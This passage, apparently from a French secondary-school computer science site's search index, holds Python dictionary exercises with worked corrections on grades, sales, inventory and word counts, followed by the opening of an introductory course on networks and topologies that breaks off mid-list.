\ud83c\udf93 Contexte : Gestion des notes d'une classe <p>Vous d\u00e9veloppez un syst\u00e8me pour g\u00e9rer les notes des \u00e9l\u00e8ves d'une classe. Chaque \u00e9l\u00e8ve a plusieurs mati\u00e8res avec plusieurs notes par mati\u00e8re.</p> <p>Cr\u00e9er un dictionnaire <code>classe</code> qui stocke pour chaque \u00e9l\u00e8ve ses notes par mati\u00e8re :</p> <pre><code>classe = {\n    'Alice': {\n        'Maths': [15, 12, 18],\n        'Fran\u00e7ais': [14, 16, 13],\n        'Histoire': [17, 15]\n    },\n    'Bob': {\n        'Maths': [10, 14, 12],\n        'Fran\u00e7ais': [13, 11, 15],\n        'Histoire': [12, 14, 16]\n    }\n}</code></pre> <p>\u00c9crire une fonction <code>moyenne_matiere(eleve, matiere)</code> qui calcule la moyenne d'un \u00e9l\u00e8ve dans une mati\u00e8re donn\u00e9e.</p> \u2192 Voir la correction              <pre><code>classe = {\n    'Alice': {\n        'Maths': [15, 12, 18],\n        'Fran\u00e7ais': [14, 16, 13],\n        'Histoire': [17, 15]\n    },\n    'Bob': {\n        'Maths': [10, 14, 12],\n        'Fran\u00e7ais': [13, 11, 15],\n        'Histoire': [12, 14, 16]\n    }\n}\n\ndef moyenne_matiere(eleve, matiere):\n    \"\"\"Calcule la moyenne d'un \u00e9l\u00e8ve dans une mati\u00e8re\"\"\"\n    if eleve in classe and matiere in classe[eleve]:\n        notes = classe[eleve][matiere]\n        if len(notes) &gt; 0:\n            moyenne = sum(notes) / len(notes)\n            return round(moyenne, 2)\n        else:\n            return 0\n    else:\n        print(f\"\u00c9l\u00e8ve {eleve} ou mati\u00e8re {matiere} non trouv\u00e9(e)\")\n        return None\n\n# Tests\nprint(f\"Moyenne d'Alice en Maths: {moyenne_matiere('Alice', 'Maths')}\")\nprint(f\"Moyenne de Bob en Fran\u00e7ais: {moyenne_matiere('Bob', 'Fran\u00e7ais')}\")</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Syst\u00e8me de notes - Partie 2 \ud83c\udf93 Contexte : Gestion des notes d'une classe (suite) <p>Continuons le d\u00e9veloppement de notre syst\u00e8me de notes avec des fonctionnalit\u00e9s plus avanc\u00e9es.</p> <p>En utilisant le dictionnaire <code>classe</code> de l'exercice pr\u00e9c\u00e9dent :</p> <ol> <li>\u00c9crire une fonction <code>moyenne_generale(eleve)</code> qui calcule la moyenne g\u00e9n\u00e9rale d'un \u00e9l\u00e8ve (moyenne de toutes ses mati\u00e8res)</li> <li>\u00c9crire une fonction <code>ajouter_note(eleve, matiere, note)</code> qui ajoute une note \u00e0 un \u00e9l\u00e8ve dans une mati\u00e8re</li> <li>\u00c9crire une fonction <code>bulletin_classe()</code> qui affiche le bulletin de tous les \u00e9l\u00e8ves avec leurs moyennes par mati\u00e8re et leur moyenne g\u00e9n\u00e9rale</li> </ol> \u2192 Voir la correction              <pre><code>def moyenne_generale(eleve):\n    \"\"\"Calcule la moyenne g\u00e9n\u00e9rale d'un \u00e9l\u00e8ve\"\"\"\n    if eleve in classe:\n        moyennes_matieres = []\n        for matiere, notes in classe[eleve].items():\n            if len(notes) &gt; 0:\n                moyenne_mat = sum(notes) / len(notes)\n                moyennes_matieres.append(moyenne_mat)\n\n        if len(moyennes_matieres) &gt; 0:\n            return round(sum(moyennes_matieres) / len(moyennes_matieres), 2)\n        else:\n            return 0\n    else:\n        print(f\"\u00c9l\u00e8ve {eleve} non trouv\u00e9\")\n        return None\n\ndef ajouter_note(eleve, matiere, note):\n    \"\"\"Ajoute une note \u00e0 un \u00e9l\u00e8ve dans une mati\u00e8re\"\"\"\n    if eleve in classe:\n        if matiere in classe[eleve]:\n            classe[eleve][matiere].append(note)\n        else:\n            classe[eleve][matiere] = [note]\n        print(f\"Note {note} ajout\u00e9e pour {eleve} en {matiere}\")\n    else:\n        print(f\"\u00c9l\u00e8ve {eleve} non trouv\u00e9\")\n\ndef bulletin_classe():\n    \"\"\"Affiche le bulletin de toute la classe\"\"\"\n    print(\"=== BULLETIN DE CLASSE ===\")\n    for eleve in classe:\n        print(f\"\\n--- {eleve} ---\")\n        for matiere, notes in classe[eleve].items():\n            moyenne_mat = moyenne_matiere(eleve, matiere)\n            print(f\"{matiere}: {moyenne_mat}/20\")\n        print(f\"Moyenne g\u00e9n\u00e9rale: {moyenne_generale(eleve)}/20\")\n\n# Tests\najouter_note('Alice', 'Maths', 16)\nbulletin_classe()</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Analyse de ventes <p>Une entreprise stocke ses donn\u00e9es de ventes dans un dictionnaire :</p> <pre><code>ventes = {\n    'Janvier': {'produit_A': 150, 'produit_B': 200, 'produit_C': 100},\n    'F\u00e9vrier': {'produit_A': 180, 'produit_B': 150, 'produit_C': 120},\n    'Mars': {'produit_A': 200, 'produit_B': 180, 'produit_C': 90}\n}</code></pre> <p>\u00c9crire les fonctions suivantes :</p> <ol> <li><code>ventes_totales_mois(mois)</code> : calcule le total des ventes d'un mois</li> <li><code>ventes_totales_produit(produit)</code> : calcule le total des ventes d'un produit sur tous les mois</li> <li><code>meilleur_mois_produit(produit)</code> : trouve le mois o\u00f9 un produit s'est le mieux vendu</li> <li><code>produit_le_plus_vendu()</code> : trouve le produit avec le plus de ventes totales</li> </ol> \u2192 Voir la correction              <pre><code>ventes = {\n    'Janvier': {'produit_A': 150, 'produit_B': 200, 'produit_C': 100},\n    'F\u00e9vrier': {'produit_A': 180, 'produit_B': 150, 'produit_C': 120},\n    'Mars': {'produit_A': 200, 'produit_B': 180, 'produit_C': 90}\n}\n\ndef ventes_totales_mois(mois):\n    \"\"\"Calcule le total des ventes d'un mois\"\"\"\n    if mois in ventes:\n        return sum(ventes[mois].values())\n    else:\n        print(f\"Mois {mois} non trouv\u00e9\")\n        return 0\n\ndef ventes_totales_produit(produit):\n    \"\"\"Calcule le total des ventes d'un produit sur tous les mois\"\"\"\n    total = 0\n    for mois, produits in ventes.items():\n        if produit in produits:\n            total += produits[produit]\n    return total\n\ndef meilleur_mois_produit(produit):\n    \"\"\"Trouve le mois o\u00f9 un produit s'est le mieux vendu\"\"\"\n    meilleur_mois = None\n    meilleures_ventes = 0\n\n    for mois, produits in ventes.items():\n        if produit in produits and produits[produit] &gt; meilleures_ventes:\n            meilleures_ventes = produits[produit]\n            meilleur_mois = mois\n\n    return meilleur_mois, meilleures_ventes\n\ndef produit_le_plus_vendu():\n    \"\"\"Trouve le produit avec le plus de ventes totales\"\"\"\n    # Calculer les ventes totales pour chaque produit\n    totaux_produits = {}\n\n    # R\u00e9cup\u00e9rer tous les produits\n    tous_produits = set()\n    for mois_data in ventes.values():\n        tous_produits.update(mois_data.keys())\n\n    # Calculer le total pour chaque produit\n    for produit in tous_produits:\n        totaux_produits[produit] = ventes_totales_produit(produit)\n\n    # Trouver le maximum\n    meilleur_produit = max(totaux_produits, key=totaux_produits.get)\n    return meilleur_produit, totaux_produits[meilleur_produit]\n\n# Tests\nprint(f\"Ventes totales de Janvier: {ventes_totales_mois('Janvier')}\")\nprint(f\"Ventes totales du produit_A: {ventes_totales_produit('produit_A')}\")\nmois, ventes_max = meilleur_mois_produit('produit_B')\nprint(f\"Meilleur mois pour produit_B: {mois} ({ventes_max} ventes)\")\nproduit, total = produit_le_plus_vendu()\nprint(f\"Produit le plus vendu: {produit} ({total} ventes)\")</code></pre> \ud83d\udce6 Gestion d'inventaire de magasin \u25b6 Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Inventaire - Valeur totale \u00c9crire une fonction <code>valeur_totale_inventaire</code> qui calcule la valeur totale d'un inventaire de magasin. <pre><code>inventaire = {\n    'pommes': {'quantite': 50, 'prix': 2.5, 'categorie': 'fruits'},\n    'bananes': {'quantite': 30, 'prix': 1.8, 'categorie': 'fruits'},\n    'carottes': {'quantite': 25, 'prix': 1.2, 'categorie': 'legumes'}\n}</code></pre> <p>La fonction doit calculer et retourner la valeur totale de l'inventaire (quantit\u00e9 \u00d7 prix pour chaque produit).</p> \u2192 Voir la correction                      <pre><code>def valeur_totale_inventaire(inventaire):\n    \"\"\"Calcule la valeur totale de l'inventaire\"\"\"\n    valeur_totale = 0\n    for produit, infos in inventaire.items():\n        valeur_totale += infos['quantite'] * infos['prix']\n    return valeur_totale\n\n# Test\ninventaire = {\n    'pommes': {'quantite': 50, 'prix': 2.5, 'categorie': 'fruits'},\n    'bananes': {'quantite': 30, 'prix': 1.8, 'categorie': 'fruits'},\n    'carottes': {'quantite': 25, 'prix': 1.2, 'categorie': 'legumes'}\n}\n\nprint(f\"Valeur totale: {valeur_totale_inventaire(inventaire)}\u20ac\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Inventaire - Produit le plus cher \u00c9crire une fonction <code>produit_plus_cher</code> qui trouve le produit le plus cher dans l'inventaire. <p>Utiliser le m\u00eame dictionnaire <code>inventaire</code> que l'exercice pr\u00e9c\u00e9dent.</p> <p>La fonction doit retourner le nom du produit le plus cher et son prix.</p> \u2192 Voir la correction                      <pre><code>def produit_plus_cher(inventaire):\n    \"\"\"Trouve le produit le plus cher\"\"\"\n    produit_cher = None\n    prix_max = 0\n\n    for produit, infos in inventaire.items():\n        if infos['prix'] &gt; prix_max:\n            prix_max = infos['prix']\n            produit_cher = produit\n\n    return produit_cher, prix_max\n\n# Test\nproduit, prix = produit_plus_cher(inventaire)\nprint(f\"Produit le plus cher: {produit} ({prix}\u20ac)\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Inventaire - Filtrage par cat\u00e9gorie \u00c9crire une fonction <code>produits_par_categorie</code> qui liste les produits d'une cat\u00e9gorie donn\u00e9e. <p>La fonction prend en param\u00e8tres l'inventaire et une cat\u00e9gorie, et retourne la liste des noms des produits de cette cat\u00e9gorie.</p> \u2192 Voir la correction                      <pre><code>def produits_par_categorie(inventaire, categorie):\n    \"\"\"Liste les produits d'une cat\u00e9gorie donn\u00e9e\"\"\"\n    produits = []\n    for produit, infos in inventaire.items():\n        if infos['categorie'] == categorie:\n            produits.append(produit)\n    return produits\n\n# Test\nfruits = produits_par_categorie(inventaire, 'fruits')\nlegumes = produits_par_categorie(inventaire, 'legumes')\nprint(f\"Fruits: {fruits}\")\nprint(f\"L\u00e9gumes: {legumes}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Inventaire - Mise \u00e0 jour des quantit\u00e9s \u00c9crire une fonction <code>mettre_a_jour_quantite</code> qui met \u00e0 jour la quantit\u00e9 d'un produit. <p>La fonction prend en param\u00e8tres l'inventaire, le nom du produit et la nouvelle quantit\u00e9.</p> <p>Elle doit g\u00e9rer le cas o\u00f9 le produit n'existe pas dans l'inventaire.</p> \u2192 Voir la correction                      <pre><code>def mettre_a_jour_quantite(inventaire, produit, nouvelle_quantite):\n    \"\"\"Met \u00e0 jour la quantit\u00e9 d'un produit\"\"\"\n    if produit in inventaire:\n        ancienne_quantite = inventaire[produit]['quantite']\n        inventaire[produit]['quantite'] = nouvelle_quantite\n        print(f\"Quantit\u00e9 de {produit} mise \u00e0 jour: {ancienne_quantite} \u2192 {nouvelle_quantite}\")\n        return True\n    else:\n        print(f\"Erreur: Le produit '{produit}' n'existe pas dans l'inventaire\")\n        return False\n\n# Test\nmettre_a_jour_quantite(inventaire, 'pommes', 75)\nmettre_a_jour_quantite(inventaire, 'oranges', 20)  # Produit inexistant</code></pre> \ud83d\udcca Analyse de donn\u00e9es de ventes \u25b6 Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Ventes - Total par mois \u00c9crire une fonction <code>ventes_totales_par_mois</code> qui calcule les ventes totales pour chaque mois. <pre><code>ventes = {\n    'janvier': {'produit_A': 150, 'produit_B': 200, 'produit_C': 100},\n    'fevrier': {'produit_A': 180, 'produit_B': 150, 'produit_C': 120},\n    'mars': {'produit_A': 200, 'produit_B': 180, 'produit_C': 90}\n}</code></pre> <p>La fonction doit retourner un dictionnaire avec le total des ventes pour chaque mois.</p> \u2192 Voir la correction                      <pre><code>def ventes_totales_par_mois(ventes):\n    \"\"\"Calcule les ventes totales pour chaque mois\"\"\"\n    ventes_par_mois = {}\n    for mois, produits in ventes.items():\n        total_mois = sum(produits.values())\n        ventes_par_mois[mois] = total_mois\n    return ventes_par_mois\n\n# Test\nventes = {\n    'janvier': {'produit_A': 150, 'produit_B': 200, 'produit_C': 100},\n    'fevrier': {'produit_A': 180, 'produit_B': 150, 'produit_C': 120},\n    'mars': {'produit_A': 200, 'produit_B': 180, 'produit_C': 90}\n}\n\nresultat = ventes_totales_par_mois(ventes)\nprint(\"Ventes totales par mois:\")\nfor mois, total in resultat.items():\n    print(f\"{mois}: {total}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Ventes - Total par produit \u00c9crire une fonction <code>ventes_totales_par_produit</code> qui calcule les ventes totales pour chaque produit sur tous les mois. <p>Utiliser le m\u00eame dictionnaire <code>ventes</code> que l'exercice pr\u00e9c\u00e9dent.</p> <p>La fonction doit retourner un dictionnaire avec le total des ventes pour chaque produit.</p> \u2192 Voir la correction                      <pre><code>def ventes_totales_par_produit(ventes):\n    \"\"\"Calcule les ventes totales pour chaque produit\"\"\"\n    ventes_par_produit = {}\n    for mois, produits in ventes.items():\n        for produit, quantite in produits.items():\n            if produit not in ventes_par_produit:\n                ventes_par_produit[produit] = 0\n            ventes_par_produit[produit] += quantite\n    return ventes_par_produit\n\n# Test\nresultat = ventes_totales_par_produit(ventes)\nprint(\"Ventes totales par produit:\")\nfor produit, total in resultat.items():\n    print(f\"{produit}: {total}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Ventes - Meilleur mois par produit \u00c9crire une fonction <code>meilleur_mois_par_produit</code> qui trouve le meilleur mois de vente pour chaque produit. <p>La fonction doit retourner un dictionnaire o\u00f9 chaque produit est associ\u00e9 \u00e0 son meilleur mois et la quantit\u00e9 vendue ce mois-l\u00e0.</p> \u2192 Voir la correction                      <pre><code>def meilleur_mois_par_produit(ventes):\n    \"\"\"Trouve le meilleur mois pour chaque produit\"\"\"\n    meilleur_mois_produit = {}\n\n    for mois, produits in ventes.items():\n        for produit, quantite in produits.items():\n            if produit not in meilleur_mois_produit:\n                meilleur_mois_produit[produit] = {'mois': mois, 'quantite': quantite}\n            elif quantite &gt; meilleur_mois_produit[produit]['quantite']:\n                meilleur_mois_produit[produit] = {'mois': mois, 'quantite': quantite}\n\n    return meilleur_mois_produit\n\n# Test\nresultat = meilleur_mois_par_produit(ventes)\nprint(\"Meilleur mois par produit:\")\nfor produit, info in resultat.items():\n    print(f\"{produit}: {info['mois']} ({info['quantite']} ventes)\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Ventes - Moyenne par produit \u00c9crire une fonction <code>moyenne_ventes_par_produit</code> qui calcule la moyenne des ventes pour chaque produit. <p>La fonction doit calculer la moyenne des ventes de chaque produit sur tous les mois disponibles.</p> \u2192 Voir la correction                      <pre><code>def moyenne_ventes_par_produit(ventes):\n    \"\"\"Calcule la moyenne des ventes pour chaque produit\"\"\"\n    # D'abord calculer les totaux par produit\n    ventes_par_produit = ventes_totales_par_produit(ventes)\n\n    # Calculer le nombre de mois\n    nb_mois = len(ventes)\n\n    # Calculer les moyennes\n    moyenne_par_produit = {}\n    for produit, total in ventes_par_produit.items():\n        moyenne_par_produit[produit] = round(total / nb_mois, 2)\n\n    return moyenne_par_produit\n\n# Test\nresultat = moyenne_ventes_par_produit(ventes)\nprint(\"Moyenne des ventes par produit:\")\nfor produit, moyenne in resultat.items():\n    print(f\"{produit}: {moyenne}\")</code></pre> \ud83d\udcda Syst\u00e8me de notation d'\u00e9tudiants \u25b6 Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Notes - Moyenne par mati\u00e8re \u00c9crire une fonction <code>moyenne_matiere</code> qui calcule la moyenne d'un \u00e9tudiant dans une mati\u00e8re donn\u00e9e. <pre><code>etudiants = {\n    'Alice': {'maths': [15, 12, 18], 'francais': [14, 16], 'histoire': [13, 15, 17]},\n    'Bob': {'maths': [10, 14, 12], 'francais': [15, 13], 'histoire': [11, 14]}\n}</code></pre> <p>La fonction prend en param\u00e8tres le dictionnaire des \u00e9tudiants, le nom de l'\u00e9tudiant et la mati\u00e8re.</p> <p>Elle doit g\u00e9rer les cas d'erreur (\u00e9tudiant ou mati\u00e8re inexistants).</p> \u2192 Voir la correction                      <pre><code>def moyenne_matiere(etudiants, etudiant, matiere):\n    \"\"\"Calcule la moyenne d'un \u00e9tudiant dans une mati\u00e8re\"\"\"\n    if etudiant in etudiants and matiere in etudiants[etudiant]:\n        notes = etudiants[etudiant][matiere]\n        if notes:\n            return round(sum(notes) / len(notes), 2)\n        else:\n            return 0\n    else:\n        print(f\"Erreur: \u00c9tudiant '{etudiant}' ou mati\u00e8re '{matiere}' non trouv\u00e9(e)\")\n        return None\n\n# Test\netudiants = {\n    'Alice': {'maths': [15, 12, 18], 'francais': [14, 16], 'histoire': [13, 15, 17]},\n    'Bob': {'maths': [10, 14, 12], 'francais': [15, 13], 'histoire': [11, 14]}\n}\n\nprint(f\"Moyenne d'Alice en maths: {moyenne_matiere(etudiants, 'Alice', 'maths')}\")\nprint(f\"Moyenne de Bob en fran\u00e7ais: {moyenne_matiere(etudiants, 'Bob', 'francais')}\")\nprint(f\"Test erreur: {moyenne_matiere(etudiants, 'Charlie', 'maths')}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Notes - Moyenne g\u00e9n\u00e9rale \u00c9crire une fonction <code>moyenne_generale</code> qui calcule la moyenne g\u00e9n\u00e9rale d'un \u00e9tudiant. <p>Utiliser le m\u00eame dictionnaire <code>etudiants</code> que l'exercice pr\u00e9c\u00e9dent.</p> <p>La fonction doit calculer la moyenne de toutes les mati\u00e8res de l'\u00e9tudiant.</p> \u2192 Voir la correction                      <pre><code>def moyenne_generale(etudiants, etudiant):\n    \"\"\"Calcule la moyenne g\u00e9n\u00e9rale d'un \u00e9tudiant\"\"\"\n    if etudiant in etudiants:\n        moyennes_matieres = []\n        for matiere, notes in etudiants[etudiant].items():\n            if notes:  # V\u00e9rifier que la liste n'est pas vide\n                moyenne = sum(notes) / len(notes)\n                moyennes_matieres.append(moyenne)\n\n        if moyennes_matieres:\n            return round(sum(moyennes_matieres) / len(moyennes_matieres), 2)\n        else:\n            return 0\n    else:\n        print(f\"Erreur: \u00c9tudiant '{etudiant}' non trouv\u00e9\")\n        return None\n\n# Test\nprint(f\"Moyenne g\u00e9n\u00e9rale d'Alice: {moyenne_generale(etudiants, 'Alice')}\")\nprint(f\"Moyenne g\u00e9n\u00e9rale de Bob: {moyenne_generale(etudiants, 'Bob')}\")\nprint(f\"Test erreur: {moyenne_generale(etudiants, 'Charlie')}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Notes - Classement par mati\u00e8re \u00c9crire une fonction <code>classement_matiere</code> qui classe les \u00e9tudiants dans une mati\u00e8re donn\u00e9e. <p>La fonction doit retourner une liste de tuples (\u00e9tudiant, moyenne) tri\u00e9e par moyenne d\u00e9croissante.</p> \u2192 Voir la correction                      <pre><code>def classement_matiere(etudiants, matiere):\n    \"\"\"Classe les \u00e9tudiants dans une mati\u00e8re\"\"\"\n    moyennes = []\n    for etudiant in etudiants:\n        if matiere in etudiants[etudiant]:\n            moyenne = moyenne_matiere(etudiants, etudiant, matiere)\n            if moyenne is not None:\n                moyennes.append((etudiant, moyenne))\n\n    # Tri par moyenne d\u00e9croissante\n    moyennes.sort(key=lambda x: x[1], reverse=True)\n    return moyennes\n\n# Test\nprint(\"Classement en maths:\")\nclassement = classement_matiere(etudiants, 'maths')\nfor i, (etudiant, moyenne) in enumerate(classement, 1):\n    print(f\"{i}. {etudiant}: {moyenne}\")\n\nprint(\"\\nClassement en fran\u00e7ais:\")\nclassement = classement_matiere(etudiants, 'francais')\nfor i, (etudiant, moyenne) in enumerate(classement, 1):\n    print(f\"{i}. {etudiant}: {moyenne}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Notes - Ajout de notes \u00c9crire une fonction <code>ajouter_note</code> qui ajoute une note \u00e0 un \u00e9tudiant dans une mati\u00e8re. <p>La fonction doit g\u00e9rer les cas o\u00f9 l'\u00e9tudiant existe mais n'a pas encore de notes dans cette mati\u00e8re.</p> <p>Elle doit aussi g\u00e9rer le cas o\u00f9 l'\u00e9tudiant n'existe pas.</p> \u2192 Voir la correction                      <pre><code>def ajouter_note(etudiants, etudiant, matiere, note):\n    \"\"\"Ajoute une note \u00e0 un \u00e9tudiant\"\"\"\n    if etudiant in etudiants:\n        if matiere in etudiants[etudiant]:\n            etudiants[etudiant][matiere].append(note)\n            print(f\"Note {note} ajout\u00e9e pour {etudiant} en {matiere}\")\n        else:\n            etudiants[etudiant][matiere] = [note]\n            print(f\"Nouvelle mati\u00e8re '{matiere}' cr\u00e9\u00e9e pour {etudiant} avec la note {note}\")\n        return True\n    else:\n        print(f\"Erreur: \u00c9tudiant '{etudiant}' non trouv\u00e9\")\n        return False\n\n# Test\nprint(\"\u00c9tat initial d'Alice en maths:\", etudiants['Alice']['maths'])\najouter_note(etudiants, 'Alice', 'maths', 16)\nprint(\"Apr\u00e8s ajout:\", etudiants['Alice']['maths'])\n\n# Ajouter une nouvelle mati\u00e8re\najouter_note(etudiants, 'Alice', 'physique', 14)\nprint(\"Nouvelles mati\u00e8res d'Alice:\", list(etudiants['Alice'].keys()))\n\n# Test avec \u00e9tudiant inexistant\najouter_note(etudiants, 'Charlie', 'maths', 15)</code></pre> \ud83d\udcdd Analyse de fr\u00e9quence de mots \u25b6 Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Texte - Comptage de fr\u00e9quence \u00c9crire une fonction <code>compter_mots</code> qui compte la fr\u00e9quence de chaque mot dans un texte. Exemple de texte : <pre><code>texte = \"Python est un langage de programmation. Python est facile \u00e0 apprendre.\"</code></pre> <p>La fonction doit ignorer la casse et la ponctuation, et retourner un dictionnaire avec les fr\u00e9quences.</p> \u2192 Voir la correction                      <pre><code>def compter_mots(texte):\n    \"\"\"Compte la fr\u00e9quence de chaque mot dans un texte\"\"\"\n    import string\n\n    # Nettoyer le texte : enlever la ponctuation et convertir en minuscules\n    texte_propre = texte.lower()\n    for caractere in string.punctuation:\n        texte_propre = texte_propre.replace(caractere, '')\n\n    # Diviser en mots\n    mots = texte_propre.split()\n\n    # Compter la fr\u00e9quence de chaque mot\n    frequences = {}\n    for mot in mots:\n        if mot in frequences:\n            frequences[mot] += 1\n        else:\n            frequences[mot] = 1\n\n    return frequences\n\n# Test\ntexte = \"Python est un langage de programmation. Python est facile \u00e0 apprendre.\"\nfrequences = compter_mots(texte)\nprint(\"Fr\u00e9quences des mots:\")\nfor mot, freq in frequences.items():\n    print(f\"{mot}: {freq}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Texte - Mots les plus fr\u00e9quents \u00c9crire une fonction <code>mots_plus_frequents</code> qui trouve les N mots les plus fr\u00e9quents dans un texte. <p>Utiliser la fonction <code>compter_mots</code> de l'exercice pr\u00e9c\u00e9dent.</p> <p>La fonction prend en param\u00e8tres le texte et le nombre N de mots \u00e0 retourner.</p> \u2192 Voir la correction                      <pre><code>def mots_plus_frequents(texte, n=3):\n    \"\"\"Trouve les N mots les plus fr\u00e9quents\"\"\"\n    # Utiliser la fonction pr\u00e9c\u00e9dente\n    frequences = compter_mots(texte)\n\n    # Convertir en liste de tuples pour le tri\n    mots_tries = []\n    for mot, freq in frequences.items():\n        mots_tries.append((mot, freq))\n\n    # Tri par fr\u00e9quence d\u00e9croissante\n    mots_tries.sort(key=lambda x: x[1], reverse=True)\n\n    # Retourner les N premiers\n    return mots_tries[:n]\n\n# Test\ntexte = \"Python est un langage de programmation. Python est facile \u00e0 apprendre.\"\ntop_3 = mots_plus_frequents(texte, 3)\nprint(f\"Top 3 des mots les plus fr\u00e9quents: {top_3}\")\n\ntop_5 = mots_plus_frequents(texte, 5)\nprint(f\"Top 5 des mots les plus fr\u00e9quents: {top_5}\")</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Texte - Mots uniques \u00c9crire une fonction <code>compter_mots_uniques</code> qui compte le nombre de mots uniques dans un texte. <p>La fonction doit retourner le nombre total de mots diff\u00e9rents (sans r\u00e9p\u00e9tition).</p> \u2192 Voir la correction                      <pre><code>def compter_mots_uniques(texte):\n    \"\"\"Compte le nombre de mots uniques dans un texte\"\"\"\n    frequences = compter_mots(texte)\n    return len(frequences)\n\ndef statistiques_texte(texte):\n    \"\"\"Affiche des statistiques compl\u00e8tes sur un texte\"\"\"\n    import string\n\n    # Nettoyer le texte pour compter le total de mots\n    texte_propre = texte.lower()\n    for caractere in string.punctuation:\n        texte_propre = texte_propre.replace(caractere, '')\n    mots_total = len(texte_propre.split())\n\n    # Calculer les statistiques\n    mots_uniques = compter_mots_uniques(texte)\n\n    print(f\"Nombre total de mots: {mots_total}\")\n    print(f\"Nombre de mots uniques: {mots_uniques}\")\n    print(f\"Pourcentage de mots uniques: {round(mots_uniques/mots_total*100, 1)}%\")\n\n    return mots_total, mots_uniques\n\n# Test\nresultat = statistiques_texte(texte)</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Texte - Mots r\u00e9p\u00e9t\u00e9s \u00c9crire une fonction <code>mots_repetes</code> qui trouve tous les mots qui apparaissent plus d'une fois dans un texte. <p>La fonction doit retourner une liste de tuples (mot, fr\u00e9quence) pour les mots r\u00e9p\u00e9t\u00e9s.</p> \u2192 Voir la correction                      <pre><code>def mots_repetes(texte):\n    \"\"\"Trouve les mots qui apparaissent plus d'une fois\"\"\"\n    frequences = compter_mots(texte)\n\n    mots_frequents = []\n    for mot, freq in frequences.items():\n        if freq &gt; 1:\n            mots_frequents.append((mot, freq))\n\n    # Trier par fr\u00e9quence d\u00e9croissante\n    mots_frequents.sort(key=lambda x: x[1], reverse=True)\n\n    return mots_frequents\n\ndef analyse_complete_texte(texte):\n    \"\"\"Analyse compl\u00e8te d'un texte\"\"\"\n    print(\"=== ANALYSE COMPL\u00c8TE DU TEXTE ===\")\n    print(f\"Texte analys\u00e9: '{texte}'\")\n    print()\n\n    # Statistiques g\u00e9n\u00e9rales\n    statistiques_texte(texte)\n    print()\n\n    # Mots les plus fr\u00e9quents\n    top_3 = mots_plus_frequents(texte, 3)\n    print(f\"Top 3 des mots les plus fr\u00e9quents: {top_3}\")\n\n    # Mots r\u00e9p\u00e9t\u00e9s\n    repetes = mots_repetes(texte)\n    if repetes:\n        print(f\"Mots r\u00e9p\u00e9t\u00e9s: {repetes}\")\n    else:\n        print(\"Aucun mot r\u00e9p\u00e9t\u00e9\")\n\n# Test\nanalyse_complete_texte(texte)</code></pre>"},{"location":"premiere/VI-Internet_et_Reseaux/Cours/","title":"Cours","text":"\ud83c\udf10 Introduction aux r\u00e9seaux <p>Comprendre les fondements de la communication num\u00e9rique</p> \ud83d\udd0c Qu'est-ce qu'un r\u00e9seau internet \ud83d\udcd6 D\u00e9finitions Fondamentales              Un r\u00e9seau local est un ensemble de machines reli\u00e9es entre elles qui \u00e9changent des informations en ne passant que par le routeur ou un switch.             Un r\u00e9seau internet est un ensemble de r\u00e9seaux locaux qui communiquent entre eux en passant par Internet.          \ud83d\udcbb Appareils Clients                  Ordinateurs, smartphones, tablettes, consoles... Tous les appareils qui consomment ou produisent des donn\u00e9es sur le r\u00e9seau.              \ud83c\udfe0 Objets Connect\u00e9s (IoT)                  Ensemble des objets connect\u00e9s comme la domotique, capteurs intelligents, appareils \u00e9lectrom\u00e9nagers connect\u00e9s.              \ud83d\udd04 Switch                  \u00c9l\u00e9ment d'un r\u00e9seau qui permet de relier les machines entre elles pour s'\u00e9changer des donn\u00e9es dans un r\u00e9seau local.              \ud83d\udce1 Routeur                  \u00c9l\u00e9ment qui permet de relier plusieurs r\u00e9seaux entre eux et d'acheminer les donn\u00e9es vers leur destination.              \ud83d\udd17 Types de Connexions              Les machines sont reli\u00e9es par diff\u00e9rents moyens de communication :          \ud83d\udd0c C\u00e2bles RJ45                  Connexion filaire standard pour les r\u00e9seaux Ethernet, offrant une connexion stable et rapide.              \ud83d\udcf6 Ondes Radio                  WiFi (Wireless Fidelity), 5G, Bluetooth... Connexions sans fil pour la mobilit\u00e9 et la flexibilit\u00e9.              \ud83d\udca1 Fibre Optique                  Transmission par signaux lumineux, offrant les d\u00e9bits les plus \u00e9lev\u00e9s pour les longues distances.              \ud83d\udccb Protocoles de Communication              La communication est d\u00e9finie et r\u00e9gie par des protocoles.             Un protocole est un ensemble de r\u00e8gles et d'actions pr\u00e9d\u00e9finies \u00e0 r\u00e9aliser dans un ordre pr\u00e9cis.          \ud83c\udf0d Distinction Web et Internet \ud83c\udf10 Internet                  Correspond \u00e0 l'ensemble des r\u00e9seaux organis\u00e9s communiquant ensemble. C'est l'infrastructure physique et logique mondiale.              \ud83d\udd78\ufe0f Web                  Correspond \u00e0 une application d'Internet qui rend accessible des ressources gr\u00e2ce aux liens hypertextes (hyperliens).              \ud83d\udd04 Topologies de R\u00e9seaux \ud83d\udcd0 Concept de Topologie              Une topologie dans les r\u00e9seaux correspond \u00e0 la disposition des machines dans un r\u00e9seau.          \u2b55 Anneau                  Chaque machine est connect\u00e9e \u00e0 deux autres, formant un cercle ferm\u00e9. Les donn\u00e9es circulent dans une direction.              \u2b50 \u00c9toile                  Toutes les machines sont connect\u00e9es \u00e0 un point central (switch/hub). Topologie la plus utilis\u00e9e domestiquement.              \ud83d\udcca Bus                  Toutes les machines 